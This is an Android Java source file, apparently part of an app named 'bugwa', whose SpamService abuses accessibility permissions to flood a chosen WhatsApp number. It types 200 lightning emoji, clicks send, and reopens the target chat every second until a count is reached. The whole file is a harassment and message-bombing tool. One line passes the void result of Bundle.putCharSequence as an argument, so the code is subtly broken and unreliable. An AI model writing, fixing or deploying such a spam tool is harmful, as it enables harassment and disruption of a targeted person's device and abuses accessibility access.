package com.kaze.bugwa;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class SpamService extends AccessibilityService {
    private int currentCount = 0;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!MainActivity.isRunning || currentCount >= MainActivity.maxCount) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";

        // 1. Deteksi jika kita lagi di WhatsApp
        if (pkg.equals("com.whatsapp")) {
            // Cari tombol kirim (send)
            AccessibilityNodeInfo sendBtn = findNodeByViewId(root, "com.whatsapp:id/send");
            AccessibilityNodeInfo inputBox = findNodeByViewId(root, "com.whatsapp:id/entry");

            if (sendBtn != null && inputBox != null) {
                // Ketik pesan
                String msg = "⚡".repeat(200); // Teks Zalgo / Spam
                inputBox.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                inputBox.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, 
                    new android.os.Bundle().putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, msg));
                
                // Klik kirim
                sendBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                currentCount++;

                // Loop untuk kirim lagi dalam 1 detik
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    if (MainActivity.isRunning) {
                        // Balik ke chat dan kirim lagi
                        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/" + MainActivity.targetNum));
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        getApplicationContext().startActivity(i);
                    }
                }, 1000);
            }
        }
    }

    private AccessibilityNodeInfo findNodeByViewId(AccessibilityNodeInfo root, String id) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
        return (nodes != null && !nodes.isEmpty()) ? nodes.get(0) : null;
    }

    @Override public void onInterrupt() {}
}